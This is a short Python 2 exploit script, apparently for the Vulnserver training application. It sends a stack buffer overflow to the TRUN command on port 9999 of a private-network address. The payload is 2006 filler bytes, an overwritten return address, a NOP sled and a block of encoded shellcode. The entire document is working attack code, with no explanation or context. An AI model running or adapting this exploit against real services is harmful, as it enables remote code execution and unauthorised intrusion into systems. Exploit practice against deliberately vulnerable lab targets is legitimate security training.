#!/usr/bin/python
import socket
server = '192.168.178.224'
sport = 9999

prefix = 'A' * 2006
eip = '\xaf\x11\x50\x62'
nopsled = '\x90' * 16
exploit = (
"\xda\xca\xd9\x74\x24\xf4\x5d\xbf\xb1\x77\x19\x4e\x29" +
"\xc9\xb1\x54\x31\x7d\x18\x83\xc5\x04\x03\x7d\xa5\x95" +
"\xec\xb2\x2d\xdb\x0f\x4b\xad\xbc\x86\xae\x9c\xfc\xfd" +
"\xbb\x8e\xcc\x76\xe9\x22\xa6\xdb\x1a\xb1\xca\xf3\x2d" +
"\x72\x60\x22\x03\x83\xd9\x16\x02\x07\x20\x4b\xe4\x36" +
"\xeb\x9e\xe5\x7f\x16\x52\xb7\x28\x5c\xc1\x28\x5d\x28" +
"\xda\xc3\x2d\xbc\x5a\x37\xe5\xbf\x4b\xe6\x7e\xe6\x4b" +
"\x08\x53\x92\xc5\x12\xb0\x9f\x9c\xa9\x02\x6b\x1f\x78" +
"\x5b\x94\x8c\x45\x54\x67\xcc\x82\x52\x98\xbb\xfa\xa1" +
"\x25\xbc\x38\xd8\xf1\x49\xdb\x7a\x71\xe9\x07\x7b\x56" +
"\x6c\xc3\x77\x13\xfa\x8b\x9b\xa2\x2f\xa0\xa7\x2f\xce" +
"\x67\x2e\x6b\xf5\xa3\x6b\x2f\x94\xf2\xd1\x9e\xa9\xe5" +
"\xba\x7f\x0c\x6d\x56\x6b\x3d\x2c\x3e\x58\x0c\xcf\xbe" +
"\xf6\x07\xbc\x8c\x59\xbc\x2a\xbc\x12\x1a\xac\xc3\x08" +
"\xda\x22\x3a\xb3\x1b\x6a\xf8\xe7\x4b\x04\x29\x88\x07" +
"\xd4\xd6\x5d\xbd\xd1\x40\x9e\xea\x68\x4f\x76\xe9\x8c" +
"\x4d\x3f\x64\x6a\xc1\x6f\x27\x23\xa1\xdf\x87\x93\x49" +
"\x0a\x08\xcb\x69\x35\xc2\x64\x03\xda\xbb\xdd\xbb\x43" +
"\xe6\x96\x5a\x8b\x3c\xd3\x5c\x07\xb5\x23\x12\xe0\xbc" +
"\x37\x42\x91\x3e\xc8\x92\x38\x3f\xa2\x96\xea\x68\x5a" +
"\x94\xcb\x5f\xc5\x67\x3e\xdc\x02\x97\xbf\xd5\x79\xa1" +
"\x55\x5a\x16\xcd\xb9\x5a\xe6\x9b\xd3\x5a\x8e\x7b\x80" +
"\x08\xab\x84\x1d\x3d\x60\x10\x9e\x14\xd4\xb3\xf6\x9a" +
"\x03\xf3\x58\x64\x66\x80\x9f\x9a\xf4\xa4\x07\xf3\x06" +
"\xe8\xb7\x03\x6d\xe8\xe7\x6b\x7a\xc7\x08\x5c\x83\xc2" +
"\x40\xf4\x0e\x82\x23\x65\x0e\x8f\xe2\x3b\x0f\x23\x3f" +
"\x2d\x9e\xc4\xc0\x52\x60\xf9\x16\x6b\x16\x3a\xab\xc8" +
"\x29\x71\x8e\x79\xa0\x79\x9c\x7a\xe1"
)
padding = 'F' * (3000 - 2006 - 4 - 16 - len(exploit))
attack = prefix + eip + nopsled + exploit + padding

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((server, sport))
print s.recv(1024)
print "Sending attack to TRUN . with length ", len(attack)
s.send(('TRUN .' + attack + '\r\n'))
print s.recv(1024)
s.send('EXIT\r\n')
print s.recv(1024)
s.close()
